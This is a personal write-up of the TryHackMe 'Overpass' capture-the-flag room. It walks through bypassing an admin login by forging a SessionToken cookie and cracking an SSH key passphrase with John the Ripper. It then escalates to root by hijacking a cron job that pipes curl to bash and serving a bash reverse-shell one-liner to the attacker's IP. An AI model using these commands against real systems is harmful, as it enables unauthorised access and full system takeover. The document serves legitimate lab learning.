-----------------------------------------------
# THM Overpass
Tags:  #Hacking #Writeup 
Creation date: 2021-10-04

-----------------------------------------------

## [[Recon]]

### [[Nmap]]

![[overpass-nmapscan.png]]

- SSH on 22
- HTTP on 80

### HTTP server

![[overpass_landing.png]]

![[overpass_about_us.png]]

![[overpass-downloads.png]]

#### Directory scan

Using [[Gobuster]]

![[overpass-dir_scan.png]]

##### Admin

Admin page has a login form.

Hint on THM says not to bruteforce, and vector is in OWASP top 10. So either [[SQL injection]] or [[broken authentication]].

## User

### [[SQLMap]]

SQLmap didnt show any injection points even with level 5 risk 3.

### Authentication it is then...

looking at the source code for the admin site there is a file called `login.js`. It has a function called login().

Contents of `login()`:

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Looks like on a successful login attempt the website sets a cookie with the name of `SessionToken`. Creating a cookie with that name and refreshing the page grants us access to the admin area. (The value of the cookie doesn't matter as the website does not authenticate it properly.)

![[overpass-cooooooooookie.png]]

Admin area contains a private RSA SSH key with a handy hint telling us to crack it ourselves.

![[overpass-admin.png]]

#### johnny boy

use `ssh2john` to convert ssh key to hash for john:

`python /usr/share/john/ssh2john.py rsa > hash`


`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

![[overpass-johnnyboy.png]]

john output says the passphrase for the ssh key is `james13`.

#### [[SSH]]

Can now SSH into the machine using the RSA key and passphrase from john.

`ssh -i rsa.txt james@10.10.197.150`

![[overpass-user.png]]

flag is in landing directory.

## Root

Nothing interesting in terms of [[SUID]] files and cant run any [[sudo]] commands due to lack of system password.

Home directory contains a TODO.txt file containing:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website**
```

Apparently `Paradox` got automated builds going, probably using a cron job or something similar. We dont have perms to use crontab so will run linpeas to sniff something out.

`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`

Linpeas flags up a cronjob running as root every minute. Downloading the contents of `overpass.thm/downloads/src/buildscript.sh` and running it with bash. We dont have perms to edit this file to get ourselves a shell, `overpass.thm` should be in `/etc/hosts` though so we can see where it is pointing to.

![[overpass-hosts.png]]

localhost... Lets change that to our IP address.

We can then set up a python server containing `downloads/src/buildscript.sh` with our own version of `buildscript.sh`.

`builtscript.sh` contents (reverse shell):

```bash
bash -i >& /dev/tcp/10.11.47.218/4444 0>&1
```

Here we set up the python server, using port 80 as cron will request the default port.

![[overpass-python_server.png]]

Then on a listener we set up earlier, we have a root shell!

![[overpass-rooty.png]]

## Notes

Possible users:

-	Ninja
-	Pars 
-	Szymex 
-	Bee 
-	MuirlandOracle